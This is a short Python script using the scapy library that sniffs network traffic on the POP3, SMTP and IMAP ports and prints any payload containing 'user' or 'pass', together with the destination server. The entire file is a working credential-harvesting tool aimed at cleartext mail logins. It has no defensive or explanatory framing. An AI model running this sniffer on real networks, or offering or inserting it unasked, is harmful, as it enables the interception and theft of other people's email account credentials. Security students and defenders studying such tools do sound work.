from scapy.all import *

def mail(packet):
    if packet.haslayer(TCP) and packet[TCP].payload:
        mail = str(packet[TCP].payload)

        if "user" in mail.lower() or "pass" in mail.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload

sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=mail, store=0)